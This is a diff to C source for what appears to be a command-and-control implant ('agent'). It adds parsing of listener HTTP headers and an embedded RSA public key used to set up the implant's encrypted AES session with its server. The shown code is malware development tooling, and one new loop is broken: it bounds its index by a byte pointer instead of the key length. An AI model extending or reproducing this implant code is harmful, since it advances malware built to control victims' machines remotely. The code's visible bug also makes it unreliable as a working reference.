@@ -171,11 +171,20 @@ INT init_agent(pAgent agent) {
     byte* AesIV = (byte*)LocalAlloc(LPTR, (sizeof(byte) * AES_BLOCK_SIZE));
 
     
-	ParseConfig(agent);
+    ParseConfig(agent);
     ReadRsaPublicKey(&RsaPublicKeyDerBytes, &RsaPublicKeySize);
+	if (RsaPublicKeySize != agent->config->RSAPubKeySize) {
+		printf("[error] rsa public key size mismatch: [%d] [%d]\n", RsaPublicKeySize, agent->config->RSAPubKeySize);
+	}
+    for (int i = 0; i < RsaPublicKeyDerBytes; i++) {
+		if (RsaPublicKeyDerBytes[i] != agent->config->RSAPubKey[i]) {
+			printf("[error] rsa public key mismatch: [%d] : [0x%02x] [0x%02x]\n", i, RsaPublicKeyDerBytes[i], agent->config->RSAPubKey[i]);
+
+		}
+    }
 
     wc_InitRsaKey(&rsaPublicKey, NULL);
-    wc_RsaPublicKeyDecode(RsaPublicKeyDerBytes, &idx, &rsaPublicKey, RsaPublicKeySize);
+    wc_RsaPublicKeyDecode(agent->config->RSAPubKey, &idx, &rsaPublicKey, agent->config->RSAPubKeySize);
 
     //generate rng object
     wc_InitRng(&rng);
@@ -198,7 +207,7 @@ INT init_agent(pAgent agent) {
 
     wc_FreeRng(&rng);
 
-    agent->AgentID = 0xdeadbeef;
+    agent->config->AgentID = 0xdeadbeef;
     agent->AESKey = AesKey;
     agent->AESKeySize = AES_256_KEY_SIZE;
     agent->EncryptedAESKey = EncryptedAesKey;
@@ -217,6 +226,7 @@ INT ParseConfig(pAgent agent) {
 
     PARSER parser = { 0 };
     INT NumHosts = 0;
+    INT NumHeaders = 0;
     PWCHAR Addr = NULL;
 	LPWSTR Buffer = NULL;
     INT Port = 0;
@@ -258,6 +268,22 @@ INT ParseConfig(pAgent agent) {
     agent->config->listenerConfig.UserAgent = agent->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
 	MemoryCopy(agent->config->listenerConfig.UserAgent, Buffer, Length);
 
+	NumHeaders = ParserReadInt32(&parser);
+	agent->config->listenerConfig.Headers = agent->pRtlAllocateHeap(
+        NtProcessHeap(agent), HEAP_ZERO_MEMORY, sizeof(LPWSTR) * ( ( NumHeaders + 1 ) * 2) 
+    );
+    for (int i = 0; i < NumHeaders; i++) {
+        Buffer = ParserReadWString(&parser, &Length);
+		agent->config->listenerConfig.Headers[i] = agent->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length + sizeof(WCHAR));
+		MemorySet(agent->config->listenerConfig.Headers[i], 0, Length + sizeof(WCHAR));
+		MemoryCopy(agent->config->listenerConfig.Headers[i], Buffer, Length);
+    }
+    agent->config->listenerConfig.Headers[NumHeaders+1] = NULL;
+
+	Buffer = ParserReadBytes(&parser, &Length);
+	agent->config->RSAPubKey = agent->pRtlAllocateHeap(NtProcessHeap(agent), HEAP_ZERO_MEMORY, Length);
+	MemoryCopy(agent->config->RSAPubKey, Buffer, Length);
+	agent->config->RSAPubKeySize = Length;
 
     return 0;
 }
